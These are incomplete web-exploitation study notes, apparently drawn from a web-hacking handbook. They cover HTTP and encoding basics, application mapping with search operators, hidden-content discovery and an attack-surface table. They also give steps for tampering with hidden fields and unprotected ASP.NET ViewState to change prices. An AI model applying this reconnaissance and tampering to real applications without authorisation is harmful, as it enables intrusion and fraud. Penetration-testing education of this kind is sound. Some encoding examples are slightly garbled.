Learning from the CTF : Web Exploitation
========================================

The blog is incomplete! Do not use

Web Application Technologies
============================

The HTTP Protocol
-----------------

Hypertext transfer protocol (HTTP) is the core communications protocol used to access the World Wide Web. A simple protocol, originally developed for retrieving static text-based resources. 
HTTP uses a message-based model in which a client sends a request message and the server returns a response message.

HTTP Requests
^^^^^^^^^^^^^

All HTTP messages (requests and responses) consist of one or more headers, each on a separate line, followed by a mandatory blank line, followed by an optional message body.  Typical HTTP request 

::

 POST /contact_form.php HTTP/1.1
 Host: developer.mozilla.org
 Content-Length: 64
 Content-Type: application/x-www-form-urlencoded
 
 name=Joe%20User&request=Send%20me%20one%20of%20your%20catalogue

The ﬁrst line of every HTTP request consists of three items, separated by spaces: 

* A verb indicating the **HTTP method**. 
* The **requested URL**. The URL typically functions as a name for the resource being requested, together with an optional query string containing parameters that the client is passing to that resource. 
* The **HTTP version** being used.

Other important

* The **Referer** header is used to indicate the URL from which the request originated (for example, because the user clicked a link on that page). 
* The **User-Agent** header is used to provide information about the browser or other client software that generated the request. 
* The **Host** header speciﬁes the hostname that appeared in the full URL being accessed. This is necessary when multiple websites are hosted on the same server, because the URL sent in the ﬁrst line of the request usually does 
  not contain a hostname. 
* The **Cookie** header is used to submit additional parameters that the server has issued to the client.

HTTP Response
^^^^^^^^^^^^^

A HTTP response is as follows

::

 HTTP/1.1 200 OK
 Date: Sat, 09 Oct 2010 14:28:02 GMT
 Server: Apache
 Last-Modified: Tue, 01 Dec 2009 20:18:22 GMT
 Pragma: no-cache  
 ETag: "51142bc1-7449-479b075b2891b"
 Expires: Thu, 01 Jan 1970 00:00:00 GMT 
 Accept-Ranges: bytes
 Content-Length: 29769
 Content-Type: text/html

 <!DOCTYPE html... (here comes the 29769 bytes of the requested web page)

The ﬁrst line of every HTTP response consists of three items, separated by spaces: 

* The HTTP version being used.
* A numeric status code indicating the result of the request. 
* A textual “reason phrase” describing the status of the response. 
  
Here are some other points of interest in the response: 

* The **Server** header contains a banner indicating the web server software being used, and sometimes other details such as installed modules and the server operating system. The information contained may or may not be accurate. 
* The **Set-Cookie** header issues the browser a further cookie; this is submitted back in the Cookie header of subsequent requests to this server. 
* The **Pragma** header instructs the browser not to store the response in its cache. 
* The **Expires** header indicates that the response content expired in the past and therefore should not be cached. These instructions are frequently issued when dynamic content is being returned to ensure that browsers obtain a fresh 
  version of this content on subsequent occasions. 
* Almost all HTTP responses contain a message body following the blank line after the headers. 
* The **Content-Type** header indicates that the body of this message contains an HTML document. 
* The **Content-Length** header indicates the length of the message body in bytes.

HTTP Methods
^^^^^^^^^^^^

* The **GET** method is designed to retrieve resources. It can be used to send parameters to the requested resource in the URL query string.  URLs are displayed on-screen and are logged in various places, such as the browser history and the web server’s access logs.
  The query string should not be used to transmit any sensitive information. 
* The **POST** method is designed to perform actions. With this method, request parameters can be sent both in the URL query string and in the body of the message.
* **HEAD** functions in the same way as a GET request, except that the server should not return a message body in its response. The server should return the same headers that it would have returned to the corresponding GET request. 
  Hence, this method can be used to check whether a resource is present before making a GET request for it. 
* **TRACE** is designed for diagnostic purposes. The server should return in the response body the exact contents of the request message it received. This can be used to detect the effect of any proxy servers between the client and server that may manipulate the request. 
* **OPTIONS** asks the server to report the HTTP methods that are available for a particular resource. The server typically returns a response containing an Allow header that lists the available methods. 
* **PUT** attempts to upload the speciﬁed resource to the server, using the content contained in the body of the request. If this method is enabled, you may be able to leverage it to attack the application, such as by uploading an arbitrary script and executing it on the server.

URLs
^^^^

A uniform resource locator (URL) is a unique identiﬁer for a web resource through which that resource can be retrieved. The format of most URLs is as follows:

::

 protocol://hostname[:port]/[path/]file[?param=value]

REST
^^^^

Representational state transfer (REST) is a style of architecture for distributed systems in which requests and responses contain representations of the current state of the system’s resources.

Although URLs containing parameters within the query string do themselves conform to REST constraints, the term “REST-style URL” is often used to signify a URL that contains its parameters within the URL ﬁle path, rather than the query string. For example, the following URL containing a query string:

::

 http://wahh-app.com/search?make=ford&model=pinto 

corresponds to the following URL containing “REST-style” parameters:

::

 http://wahh-app.com/search/ford/pinto

HTTP Headers
^^^^^^^^^^^^

General Headers

* **Connection** tells the other end of the communication whether it should close the TCP connection after the HTTP transmission has completed or keep it open for further messages. If the value sent is keep-alive, the connection is persistent and not closed, allowing for subsequent requests to the same server to be done.
* **Content-Encoding** speciﬁes what kind of encoding is being used for the content contained in the message body, such as gzip, which is used by some applications to compress responses for faster transmission. 
* **Content-Length** speciﬁes the length of the message body, in bytes (except in the case of responses to HEAD requests, when it indicates the length of the body in the response to the corresponding GET request). 
* **Content-Type** speciﬁes the type of content contained in the message body, such as text/html for HTML documents. 
* **Transfer-Encoding** speciﬁes any encoding that was performed on the message body to facilitate its transfer over HTTP. It is normally used to specify chunked encoding.

Request Headers

* **Accept** tells the server what kinds of content the client is willing to accept, such as image types, ofﬁce document formats, and so on. 
* **Accept-Encoding** tells the server what kinds of content encoding the client is willing to accept. 
* **Authorization** submits credentials to the server for one of the built-in HTTP authentication types. 
* **Cookie** submits cookies to the server that the server previously issued. 
* **Host** speciﬁes the hostname that appeared in the full URL being requested.
* **If-Modified-Since** speciﬁes when the browser last received the requested resource. If the resource has not changed since that time, the server may instruct the client to use its cached copy, using a response with status code 304. 
* **If-None-Match** speciﬁes an entitytag, which is an identiﬁer denoting the contents of the message body. The browser submits the entity tag that the server issued with the requested resource when it was last received. The server can use the entity tag to determine whether the browser may use its cached copy of the resource. 
* **Origin** is used in cross-domain Ajax requests to indicate the domain from which the request originated. 
* **Referer** speciﬁes the URL from which the current request originated. 
* **User-Agent** provides information about the browser or other client software that generated the request.

Response Headers

* **Access-Control-Allow-Origin** indicates whether the resource can be retrieved via cross-domain Ajax requests. 
* **Cache-Control** passes caching directives to the browser (for example, no-cache). 
* **ETag** speciﬁes an entity tag. Clients can submit this identiﬁer in future requests for the same resource in the If-None-Match header to notify the server which version of the resource the browser currently holds in its cache. 
* **Expires** tells the browser for how long the contents of the message body are valid. The browser may use the cached copy of this resource until this time. 
* **Location** is used in redirection responses (those that have a status code starting with 3) to specify the target of the redirect. 
* **Pragma** passes caching directives to the browser (for example, no-cache). 
* **Server** provides information about the web server software being used. 
* **Set-Cookie** issues cookies to the browser that it will submit back to the server in subsequent requests. 
* **WWW-Authenticate** is used in responses that have a 401 status code to provide details on the type(s) of authentication that the server supports. 
* **X-Frame-Options** indicates whether and how the current response may be loaded within a browser frame.

Cookies
^^^^^^^

The cookie mechanism enables the server to send items of data to the client, which the client stores and resubmits to the server. A server issues a cookie using the Set-Cookie response header,

::

 Set-Cookie: tracking=tI8rk7joMx44S2Uu85nSWc 

The user’s browser then automatically adds the following header to subsequent requests back to the same server:

::

 Cookie: tracking=tI8rk7joMx44S2Uu85nSWc 
 
Cookies normally consist of a name/value pair, as shown, but they may consist of any string that does not contain a space. Multiple cookies can be issued by using multiple Set-Cookie headers in the server’s response. 
These are submitted back to the server in the same Cookie header, with a semicolon separating different individual cookies. In addition to the cookie’s actual value, the Set-Cookie header can include any of the following optional 
attributes, which can be used to control how the browser handles the cookie:

* **expires** sets a date until which the cookie is valid. This causes the browser to save the cookie to persistent storage, and it is reused in subsequent browser sessions until the expiration date is reached. 
  If this attribute is not set, the cookie is used only in the current browser session. 
* **domain** speciﬁes the domain for which the cookie is valid. This must be the same or a parent of the domain from which the cookie is received. 
* **path** speciﬁes the URL path for which the cookie is valid. 
* **secure**   — If this attribute is set, the cookie will be submitted only in HTTPS requests. 
* **HttpOnly** — If this attribute is set, the cookie cannot be directly accessed via client-side JavaScript.

Status Codes
^^^^^^^^^^^^

Each HTTP response message must contain a status code in its ﬁrst line, indicating the result of the request. The status codes fall into ﬁve groups, according to the code’s ﬁrst digit: 

* **1xx** — Informational. 
* **2xx** — The request was successful. 
* **3xx** — The client is redirected to a different resource. 
* **4xx** — The request contains an error of some kind. 
* **5xx** — The server encountered an error fulﬁlling the request. 

Usual status codes:

* **100 Continue** is sent in some circumstances when a client submits a request containing a body. The response indicates that the request headers were received and that the client should continue sending the body. The server returns a second response when the request has been completed. 
* **200 OK** indicates that the request was successful and that the response body contains the result of the request. 
* **201 Created** is returned in response to a PUT request to indicate that the request was successful. 
* **301 Moved Permanently** redirects the browser permanently to a different URL, which is speciﬁed in the Location header. The client should use the new URL in the future rather than the original. 
* **302 Found** redirects the browser temporarily to a different URL, which is speciﬁed in the Location header. The client should revert to the original URL in subsequent requests. 
* **304 Not Modified** instructs the browser to use its cached copy of the requested resource. The server uses the If-Modified-Since and If-NoneMatch request headers to determine whether the client has the latest version of the resource. 
* **400 Bad Request** indicates that the client submitted an invalid HTTP request. You will probably encounter this when we have modiﬁed a request in certain invalid ways, such as by placing a space character into the URL. 
* **401 Unauthorized** indicates that the server requires HTTP authentication before the request will be granted. The WWW-Authenticate header contains details on the type(s) of authentication supported.
* **403 Forbidden** indicates that no one is allowed to access the requested resource, regardless of authentication. 
* **404 Not Found** indicates that the requested resource does not exist. 
* **405 Method Not Allowed** indicates that the method used in the request is not supported for the speciﬁed URL. For example, you may receive this status code if you attempt to use the PUT method where it is not supported. 
* **413 Request Entity Too Large** — If you are probing for buffer overﬂow vulnerabilities in native code, and therefore are submitting long strings of data, this indicates that the body of your request is too large for the server to handle. 
* **414 Request URI Too Long** is similar to the 413 response. It indicates that the URL used in the request is too large for the server to handle. 
* **500 Internal Server Error** indicates that the server encountered an error fulﬁlling the request. This normally occurs when you have submitted unexpected input that caused an unhandled error somewhere within the application’s processing. You should closely review the full contents of the server’s response for any details indicating the nature of the error. 
* **503 Service Unavailable** normally indicates that, although the web server itself is functioning and can respond to requests, the application accessed via the server is not responding. You should verify whether this is the result of any action you have performed.

HTTP Authentication
^^^^^^^^^^^^^^^^^^^

The HTTP protocol includes its own mechanisms for authenticating users using various authentication schemes:

* **Basic** is a simple authentication mechanism that sends user credentials as a Base64-encoded string in a request header with each message. 
* **NTLM** is a challenge-response mechanism and uses a version of the Windows NTLM protocol. 
* **Digest** is a challenge-response mechanism and uses MD5 checksums of a nonce with the user’s credentials.

Encoding Schemes
----------------

URL Encoding
^^^^^^^^^^^^

URLs are permitted to contain only the printable characters in the US-ASCII character set — that is, those whose ASCII code is in the range 0x20 to 0x7e, inclusive.

The URL-encoded form of any character is the % preﬁx followed by the character’s two-digit ASCII code expressed in hexadecimal. Here are some characters that are commonly URL-encoded: 

::

 %3d — = 
 %25 — % 
 %20 — Space 
 %0a — New line 
 %00 — Null byte 
 
A further encoding to be aware of is the + character, which represents a URL-encoded space (in addition to the %20 representation of a space).

For the purpose of attacking web applications, you should URLencode any of the following characters when you insert them as data into an HTTP request: 

::

 space % ? & = ; + 
 
(Of course, you will often need to use these characters with their special meaning when modifying a request — for example, to add a request parameter to the query string. In this case, they should be used in their literal form.)

Unicode Encoding
^^^^^^^^^^^^^^^^

Unicode is a character encoding standard that is designed to support all of the world’s writing systems.  For transmission over HTTP, the 16-bit Unicode-encoded form of a character is the %u preﬁx followed by the character’s Unicode code point expressed in hexadecimal: 

::

 %u2215 — / 
 %u00e9 — é 
 
UTF-8 is a variable-length encoding standard that employs one or more bytes to express each character. For transmission over HTTP, the UTF-8-encoded form of a multibyte character simply uses each byte expressed in hexadecimal 
and preceded by the % preﬁx:

::

 %c2%a9 — © 
 %e2%89%a0 — z 
 
For the purpose of attacking web applications, Unicode encoding is primarily of interest because it can sometimes be used to defeat input validation mechanisms. If an input ﬁlter blocks certain malicious expressions, 
but the component that subsequently processes the input understands Unicode encoding, it may be possible to bypass the ﬁlter using various standard and malformed Unicode encodings.

HTML Encoding
^^^^^^^^^^^^^

HTML encoding is used to represent problematic characters so that they can be safely incorporated into an HTML document. Various characters have special meaning as metacharacters within HTML and are used to deﬁne a document’s 
structure rather than its content. To use these characters safely as part of the document’s content, it is necessary to HTML-encode them. HTML encoding deﬁnes numerous HTML entities to represent speciﬁc literal characters: 

::

 &quot; — "
 &apos; — ' 
 &amp;  — & 
 &lt;   — < 
 &gt;   — > 
 
In addition, any character can be HTML-encoded using its ASCII code in decimal form: 

::

 &#34; — " 
 &#39; — ' 
 
or by using its ASCII code in hexadecimal form (preﬁxed by an x):

::

 &#x22; — " 
 &#x27; — ' 
 
When you are attacking a web application, your main interest in HTML encoding is likely to be when probing for cross-site scripting vulnerabilities. If an application returns user input unmodiﬁed within its responses, it is probably 
vulnerable, whereas if dangerous characters are HTML-encoded, it may be safe.

Base64 Encoding
^^^^^^^^^^^^^^^

Base64 encoding allows any binary data to be safely represented using only printable ASCII characters.

Hex Encoding
^^^^^^^^^^^^

.. Tip :: Do not assume that the application will respond with 200 OK if a requested resource exists and 404 Not Found if it does not. Many applications handle requests for nonexistent resources in a customized way, often returning a bespoke error message and a 200 response code. Furthermore, some requests for existent resources may receive a non-200 response. 


Mapping the Application
=======================

.. Tip :: Many web servers contain a ﬁle named robots.txt in the web root that contains a list of URLs that the site does not want web spiders to visit or search engines to index. Sometimes, this ﬁle contains references to sensitive functionality, which you are certainly interested in spidering. Some spidering tools designed for attacking web applications check for the robots.txt ﬁ le and use all URLs within it as seeds in the spidering process. In this case, the robots.txt ﬁ le may be counterproductive to the security of the web application.

.. Tip :: Applications that employ REST-style URLs use portions of the URL ﬁle path to uniquely identify data and other resources used within the application 

.. Tip :: In addition to the proxy/spider tools just described, another range of tools that are often useful during application mapping are the various browser extensions that can perform HTTP and HTML analysis from within the browser interface. For example, the IEWatch tool shown in Figure 4-3, which runs within Microsoft Internet Explorer, monitors all details of requests and responses, including headers, request parameters, and cookies. It analyzes every application page to display links, scripts, forms, and thick-client components. Of course, all this information can be viewed in your intercepting proxy, but having a second record of useful mapping data can only help you better understand the application and enumerate all its functionality

.. Tip :: Do not assume that the application will respond with 200 OK if a requested resource exists and 404 Not Found if it does not. Many applications handle requests for nonexistent resources in a customized way, often returning a bespoke error message and a 200 response code

Discovering Hidden Content
--------------------------

* Backup copies of live ﬁles. In the case of dynamic pages, their ﬁle extension may have changed to one that is not mapped as executable, enabling you to review the page source for vulnerabilities that can then be exploited on the live page. 
* Backup archives that contain a full snapshot of ﬁles within (or indeed outside) the web root, possibly enabling you to easily identify all content and functionality within the application. 
* New functionality that has been deployed to the server for testing but not yet linked from the main application. 
* Default application functionality in an off-the-shelf application that has been superﬁcially hidden from the user but is still present on the server. 
* Old versions of ﬁles that have not been removed from the server. In the case of dynamic pages, these may contain vulnerabilities that have been ﬁxed in the current version but that can still be exploited in the old version. 
* Conﬁguration and include ﬁles containing sensitive data such as database credentials. 
* Source ﬁles from which the live application’s functionality has been compiled. 
* Comments in source code that in extreme cases may contain information such as usernames and passwords but that more likely provide information about the state of the application. Key phrases such as “test this function” or something similar are strong indicators of where to start hunting for vulnerabilities. 
* Log ﬁles that may contain sensitive information such as valid usernames, session tokens, URLs visited, and actions performed.

When querying a search engine, you can use various advanced techniques to maximize the effectiveness of your research. The following suggestions apply to Google. You can find the corresponding queries on other engines by selecting their Advanced Search option. 

* site:www.wahh-target.com returns every resource within the target site that Google has a reference to. 
* site:www.wahh-target.com login returns all the pages containing the expression login. In a large and complex application, this technique can be used to quickly home in on interesting resources, such as site maps, password reset functions, and administrative menus. 
* link:www.wahh-target.com returns all the pages on other websites and applications that contain a link to the target. This may include links to old content, or functionality that is intended for use only by third parties, such as partner links. 
* related:www.wahh-target.com returns pages that are “similar” to the target and therefore includes a lot of irrelevant material. However, it may also discuss the target on other sites, which may be of interest.


Analyzing the Web application
-----------------------------

Key areas to investigate: 

* The application’s core functionality — the actions that can be leveraged to perform when used as intended 
* Other, more peripheral application behavior, including off-site links, error messages, administrative and logging functions, and the use of redirects 
* The core security mechanisms and how they function — in particular, management of session state, access controls, and authentication mechanisms and supporting logic (user registration, password change, and account recovery).
* All the different locations at which the application processes user-supplied input — every URL, query string parameter, item of POST data, and cookie 
* The technologies employed on the client side, including forms, clientside scripts, thick-client components (Java applets, ActiveX controls, and Flash), and cookies 
* The technologies employed on the server side, including static and dynamic pages, the types of request parameters employed, the use of SSL, web server software, interaction with databases, e-mail systems, and other back-end components 
* Any other details that may be gleaned about the internal structure and functionality of the server-side application — the mechanisms it uses behind the scenes to deliver the functionality and behavior that are visible from the client perspective


Identifying Entry Points for User Input
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

* Every URL string up to the query string marker
* Every parameter submitted within the URL query string
* Every parameter submitted within the body of a POST request
* Every cookie
* Every other HTTP header that the application might process — in particular, the User-Agent, Referer, Accept, Accept-Language, and Host headers
* Out of band channels

 * A web mail application that processes and renders e-mail messages received via SMTP
 * A publishing application that contains a function to retrieve content via HTTP from another server
 * An intrusion detection application that gathers data using a network sniffer and presents this using a web application interface 
 * Any kind of application that provides an API interface for use by non-browser user agents, such as cell phone apps, if the data processed via this interface is shared with the primary web application

.. Tip ::  Burp Intruder contains a built-in payload list containing a large number of user agent strings for different types of devices. You can carry out a simple attack that performs a GET request to the main application page supplying different user agent strings and then review the intruder results to identify anomalies that suggest a different user interface is being presented

Identifying Server-Side Technologies
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

**Banner Grabbing**

Many web servers disclose ﬁne-grained version information, both about the web server software itself and about other components that have been installed. 

**File Extensions**

File extensions used within URLs often disclose the platform or programming language used to implement the relevant functionality. For example:

* asp        - Microsoft Active Server Pages
* aspx       - Microsoft ASP.NET
* jsp        - Java Server Pages
* cfm        - Cold Fusion
* php        - The PHP language
* d2w        - WebSphere
* pl         - The Perl language
* py         - The Python language
* dll        - Usually compiled native code (C or C++)
* nsf or ntf - Lotus Domino

**Directory Names**

Subdirectory names that indicate the presence of an associated technology. For example:

* servlet                      - Java servlets
* pls                          - Oracle Application Server PL/SQL gateway
* cfdocs or cfide              - Cold Fusion
* SilverStream                 - The SilverStream web server
* WebObjects or {function}.woa - Apple WebObjects
* rails                        - Ruby on Rails

**Session Tokens**

Many web servers and web application platforms generate session tokens by default with names that provide information about the technology in use. For example:

* JSESSIONID        - The Java Platform
* ASPSESSIONID      - Microsoft IIS server
* ASP.NET_SessionId - Microsoft ASP.NET
* CFID / CFTOKEN    - Cold Fusion
* PHPSESSID         - PHP

Identifying Server-Side Functionality
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

**Dissecting Requests**

Consider the following URL, which is used to access a search function:

::

 https://wahh-app.com/calendar.jsp?name=new%20applicants&isExpired= 0&startDate=22%2F09%2F2010&endDate=22%2F03%2F2011&OrderBy=name

* .jsp ﬁle extension indicates that Java Server Pages are in use. 
* We may guess that a search function will retrieve its information from either an indexing system or a database. 
* The presence of the OrderBy parameter suggests that a back-end database is being used and that the value you submit may be used as the ORDER BY clause of a SQL query. This parameter may well be vulnerable to SQL injection, 
  as may any of the other parameters if they are used in database queries. 
* Also of interest among the other parameters is the isExpired ﬁeld. This appears to be a Boolean ﬂag specifying whether the search query should include expired content. If the application designers did not expect ordinary users to be able retrieve any expired content, changing this parameter from 0 to 1 could identify an access control vulnerability. 

The following URL, which allows users to access a content management system, contains a different set of clues:

::

 https://wahh-app.com/workbench.aspx?template=NewBranch.tpl&loc= /default&ver=2.31&edit=false

* .aspx ﬁle extension indicates that this is an ASP.NET application. 
* It also appears highly likely that the template parameter is used to specify a ﬁlename, and the loc parameter is used to specify a directory. 
* The possible ﬁle extension .tpl appears to conﬁrm this, as does the location /default, which could very well be a directory name.
* It is possible that the application retrieves the template ﬁle speciﬁed and includes the contents in its response. These parameters may well be vulnerable to path traversal attacks, allowing arbitrary ﬁles to be read from the server. Also of interest is the edit parameter, which is set to false. It may be that changing this value 
  to true will modify the registration functionality, potentially enabling an attacker to edit items that the application developer did not intend to be editable. 
* The ver parameter does not have any readily guessable purpose, but it may be that modifying this will cause the application to perform a different set of functions that an attacker could exploit.

Finally, consider the following request, which is used to submit a question to application administrators:

::

 POST /feedback.php HTTP/1.1 Host: wahh-app.com Content-Length: 389
 from=user@wahh-mail.com&to=helpdesk@wahh-app.com&subject= Problem+logging+in&message=Please+help...

* .php ﬁle extension indicates that the function is implemented using the PHP language. 
* Also, it is extremely likely that the application is interfacing with an external e-mail system, and 
* it appears that user-controllable input is being passed to that system in all relevant ﬁelds of the e-mail. The function may be exploitable to send arbitrary messages to any recipient, and any of the ﬁelds may also be 
  vulnerable to e-mail header injection.

Mapping the Attack Surface
--------------------------

The final stage of the mapping process is to identify the various attack surfaces exposed by the application and the potential vulnerabilities that are commonly associated with each one. The following is a rough guide to some key types of behavior and functionality that you may identify, and the kinds of vulner-
abilities that are most commonly found within each one.

* Client-side validation                    : Checks may not be replicated on the server
* Database interaction                      : SQL injection
* File uploading and downloading            : Path traversal vulnerabilities, stored cross-site scripting
* Display of user-supplied data             : Cross-site scripting
* Dynamic redirects                         : Redirection and header injection attacks
* Social networking features                : username enumeration, stored cross-site scripting
* Login                                     : Username enumeration, weak passwords, ability to use bruteforce
* Multistage login                          : Logic flaws
* Session state                             : Predictable tokens, insecure handling of tokens
* Access controls                           : Horizontal and vertical privilege escalation
* User impersonation functions              : Privilege escalation
* Use of cleartext communications           : Session hijacking, capture of credentials and other sensitive data
* Off-site links                            : Leakage of query string parameters in the Referer header
* Interfaces to external systems            : Shortcuts in the handling of sessions and/or access controls
* Error messages                            : Information leakage
* E-mail interaction                        : E-mail and/or command injection
* Native code components or interaction     : Buffer overfl ows
* Use of third-party application components : Known vulnerabilities
* Identifiable web server software          : Common configuration weaknesses, known software bugs


Bypassing Client-Side Controls
==============================

Transmitting Data Via the Client
--------------------------------

Hidden Form Fields
^^^^^^^^^^^^^^^^^^

Hidden HTML form ﬁelds are a common mechanism for transmitting data via the client in a superﬁcially unmodiﬁable way. If a ﬁeld is ﬂagged as hidden, it is not displayed on-screen. However, the ﬁeld’s name and value are 
stored within the form and are sent back to the application when the user submits the form.

HTTP Cookies
^^^^^^^^^^^^

Another common mechanism for transmitting data via the client is HTTP cookies. 

URL Parameters 
^^^^^^^^^^^^^^

Applications frequently transmit data via the client using preset URL parameters. For example, when a user browses the product catalog, the application may provide him with hyperlinks to URLs like the following:

::

 http://mdsec.net/shop/?prod=3&pricecode=32


The Referer Header 
^^^^^^^^^^^^^^^^^^

Browsers include the Referer header within most HTTP requests. It is used to indicate the URL of the page from which the current request originated — either because the user clicked a hyperlink or submitted a form, or because the page referenced other resources such as images. Hence, it can be leveraged as a mechanism for transmitting data via the client

Opaque Data
^^^^^^^^^^^

Sometimes, data transmitted via the client is not transparently intelligible because it has been encrypted or obfuscated in some way.

.. Note :: Opaque data items transmitted via the client are often part of the application’s session-handling mechanism. Session tokens sent in HTTP cookies, anti-CSRF tokens transmitted in hidden ﬁ elds, and one-time URL tokens for accessing application resources, are all potential targets for client-side tampering

The ASP.NET ViewState
^^^^^^^^^^^^^^^^^^^^^

ASP.NET ViewState. This is a hidden ﬁeld that is created by default in all ASP.NET web applications. It contains serialized information about the state of the current page. The ASP.NET platform employs the ViewState to enhance server performance. It enables the server to preserve elements within the user interface 
across successive requests without needing to maintain all the relevant state information on the server side.

The ViewState parameter is actually a Base64-encoded string that can be easily decoded.

By default, the ASP.NET platform protects the ViewState from tampering by adding a keyed hash to it (known as MAC protection). However, some applications disable this default protection, meaning that you can modify the ViewState’s 
value to determine whether it has an effect on the application’s server-side processing.

Burp Suite includes a ViewState parser that indicates whether the ViewState is MAC protected, as shown in Figure 5-3. If it is not protected, you can edit the contents of the ViewState within Burp using the hex editor below the ViewState tree. When you send the message to the server or client, Burp sends your updated ViewState, and, in the present example, enables you to change the price of the item being purchased

Hack Steps

* If you are attacking an ASP.NET application, verify whether MAC protection is enabled for the ViewState. This is indicated by the presence of a 20-byte hash at the end of the ViewState structure, and you can use the ViewState parser in Burp Suite to confirm whether this is present. 
* Even if the ViewState is protected, use Burp to decode the ViewState on various application pages to discover whether the application is using the ViewState to transmit any sensitive data via the client. 
* Try to modify the value of a specific parameter within the ViewState without interfering with its structure, and see whether an error message results. 
* If you can modify the ViewState without causing errors, you should review the function of each parameter within the ViewState and see whether the application uses it to store any custom data. Try to submit crafted values as each parameter to probe for common vulnerabilities, as you would for any other item of data being transmitted via the client. 
* Note that MAC protection may be enabled or disabled on a per-page basis, so it may be necessary to test each significant page of the application for ViewState hacking vulnerabilities. If you are using Burp Scanner with passive scanning enabled, Burp automatically reports any pages that use the ViewState without MAC protection enabled.

Capturing User Data: HTML Forms
-------------------------------

HTML forms are the simplest and most common way to capture input from the user and submit it to the server. With the most basic uses of this method, users type data into named text ﬁelds, which are submitted to the server 
as name/value pairs. However, forms can be used in other ways; they can impose restrictions or perform validation checks on the user-supplied data.

Length Limits
^^^^^^^^^^^^^

Consider the following variation on the original HTML form, which imposes a maximum length of 1 on the quantity ﬁeld:

::

 <form method=”post” action=”Shop.aspx?prod=1”> 
 Product: iPhone 5 <br/> 
 Price: 449 <br/> 
 Quantity: <input type=”text” name=”quantity” maxlength=”1”> <br/> 
 <input type=”hidden” name=”price” value=”449”> <input type=”submit” value=”Buy”> </form>

Here, the browser prevents the user from entering more than one character into the input ﬁeld

Script-Based Validation
^^^^^^^^^^^^^^^^^^^^^^^

A form may include multiple values such as a user registration form might contain ﬁelds for name, e-mail address, telephone number, and zip code, all of which expect different types of input. Therefore, it is common to see customized client-side input validation implemented within scripts.

::

 <form method=”post” action=”Shop.aspx?prod=2” onsubmit=”return validateForm(this)”>

The onsubmit attribute of the form tag instructs the browser to execute the ValidateForm function when the user clicks the Submit button, and to submit the form only if this function returns true. This mechanism enables the clientside logic to intercept an attempted form submission, perform customized validation checks on the user’s input, and decide whether to accept that input. 

Disabled Elements
^^^^^^^^^^^^^^^^^

If an element on an HTML form is ﬂagged as disabled, it appears on-screen but is usually grayed out and cannot be edited or used in the way an ordinary control can be. Also, it is not sent to the server when the form is submitted.
For example, consider the following form:

::

 <form method=”post” action=”Shop.aspx?prod=5”> 
 Product: Blackberry Rude <br/> 
 Price: <input type=”text” disabled=”true” name=”price” value=”299”> 

When this form is submitted, only the quantity parameter is sent to the server. However, the presence of a disabled ﬁeld suggests that a price parameter may originally have been used by the application, perhaps for testing purposes during development. This parameter would have been submitted to the server and may have been processed by the application.


Capturing User Data: Browser Extensions
---------------------------------------

Besides HTML forms, the other main method for capturing, validating, and submitting user data is to use a client-side component that runs in a browser extension, such as Java or Flash.

Browser extensions can capture data in various ways — via input forms and in some cases by interacting with the client operating system’s ﬁ lesystem or registry. They can perform arbitrarily complex validation and manipulation of captured data before submission to the server

Common Browser Extension Technologies
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

The browser extension technologies you are most likely to encounter are Java applets, Flash, and Silverlight. Because these are competing to achieve similar goals, they have similar properties in their architecture that are relevant to security: 

* They are compiled to an intermediate bytecode. 
* They execute within a virtual machine that provides a sandbox environment for execution. 
* They may use remoting frameworks employing serialization to transmit complex data structures or objects over HTTP.

Java Java applets run in the Java Virtual Machine (JVM) and are subject to the sandboxing applied by the Java Security Policy.
Flash Flash objects run in the Flash virtual machine, and, like Java applets, are sandboxed from the host computer. recent change in Flash is ActionScript 3 and its remoting capability with Action Message Format (AMF) serialization.
Silverlight Silverlight is Microsoft’s alternative to Flash. It is designed with the similar goal of enabling rich, desktop-like applications, allowing web applications to provide a scaled-down .NET experience within the browser, in a sandboxed environment. 

Approaches to Browser Extensions
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

two broad techniques when targeting applications that use browser extension components. 

* First, you can intercept and modify the requests made by the component and the responses received from the server. The data being transmitted may be obfuscated or encrypted, or may be serialized using schemes that are speciﬁ c to the technology being used.
* Second, you can target the component itself directly and attempt to decompile its bytecode to view the original source, or interact dynamically with the component using a debugger. 

Handling Serialized Data 
^^^^^^^^^^^^^^^^^^^^^^^^

Applications may serialize data or objects before transmitting them within HTTP requests. Although it may be possible to decipher some of the string-based data simply by inspecting the raw serialized data, in general you need to unpack the serialized data before it can be fully understood.
And if you want to modify the data to interfere with the application’s processing, ﬁ rst you need to unpack the serialized content, edit it as required, and reserialize it correctly


Java Serialization

Messages containing serialized Java objects usually can be identiﬁ ed because they have the following Content-Type header:

::

 Content-Type: application/x-java-serialized-object 

DSer is a handy plug-in to Burp Suite that provides a framework for viewing and manipulating serialized Java objects that have been intercepted within Burp. This tool converts the primitive data within the intercepted object into XML format for easy editing. When you have modiﬁ ed the relevant data, DSer then reserializes the object and updates the HTTP request accordingly.

Flash Serialization 

Flash uses its own serialization format that can be used to transmit complex data structures between server and client components. Action Message Format (AMF) normally can be identiﬁ ed via the following Content-Type header:

::

 Content-Type: application/x-amf 
 
Burp natively supports AMF format

Silverlight Serialization 

Silverlight applications can make use of the Windows Communication Foundation (WCF) remoting framework that is built in to the .NET platform. Silverlight client components using WCF typically employ Microsoft’s .NET Binary Format for SOAP (NBFS), which can be identiﬁ ed via the following Content-Type header:

::

 Content-Type: application/soap+msbin1 


`WCF Binary SOAP plug-in <https://github.com/GDSSecurity/WCF-Binary-SOAP-Plug-In>`_  is a Burp Suite plug-in designed to encode and decode WCF Binary Soap request and response data ("Content-Type: application/soap+msbin1").

Decompiling Browser Extensions
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Java applets normally are packaged as .jar (Java archive) ﬁ les, and Silverlight objects are packaged as .xap ﬁ les. Both of these ﬁ le types use the zip archive format, so you can easily unpack them by renaming the ﬁ les with the .zip extension and then using any zip reader to unpack them into the individual ﬁ les they contain. The Java bytecode is contained in .class ﬁ les, and the Silverlight bytecode is contained in .dll ﬁ les. After unpacking the relevant ﬁ le package, you need to decompile these ﬁ les to obtain source code. Flash objects are packaged as .swf ﬁ les and don’t require any unpacking before you use a decompiler. 

Java Tools Java bytecode can be decompiled to into Java source code using a tool called Jad (the Java decompiler), which is available from:
www.varaneckas.com/jad
